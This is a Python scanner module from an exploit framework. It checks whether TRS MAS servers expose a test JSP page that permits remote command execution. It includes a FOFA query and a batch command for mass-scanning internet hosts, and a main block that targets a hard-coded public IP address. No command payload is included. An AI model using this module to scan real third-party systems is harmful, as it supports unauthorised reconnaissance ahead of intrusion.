# coding=utf-8
# @Author   : zpchcbd HG team
# @Blog     : https://www.cnblogs.com/zpchcbd/
# @Time     : 2022-08-08 20:21

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugLevel, BugType
from core.request.asynchttp import *

# fofa: header="X-Mas-Server" || banner="X-Mas-Server"
# python3 batch.py -fs "header=\"X-Mas-Server\" || banner=\"X-Mas-Server\"" -m exploit.scripts.TRS.mas.rce -cs


class Script(BaseScript):
    name = 'TRS MAS'

    def __init__(self, target):
        super().__init__()
        # target
        self.target = target
        # level
        self.bug_level = BugLevel.HIGH
        # type
        self.bug_type = BugType.RCE
        # number
        self.bug_number = ''
        # refer
        self.bug_refer = ''
        # detect
        self.detect_path_list = ['/mas/sysinfo/testCommandExecutor.jsp']
        # exec
        self.exec_path_list = []
        # infor
        self.info = '''TRS-MAS 测试文件 testCommandExecutor.jsp 远程命令执行 北京拓尔思信息技术股份有限公司 
        TRS MAS是基于移动互联网时代音视频的使用特点，推出的一套通用型媒资管理系统。'''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                async with session.get(url=url, headers=self.headers, timeout=self.req_timeout, verify_ssl=False) as response:
                    await asyncio.sleep(2)
                    text = await response.text()
                    if response is not None and response.status == 200 and '测试命令行进程执行' in text:
                        self.flag = True
                        gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                        return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}


if __name__ == '__main__':
    print(asyncio.get_event_loop().run_until_complete(Script('http://123.232.38.234:88').attack()))
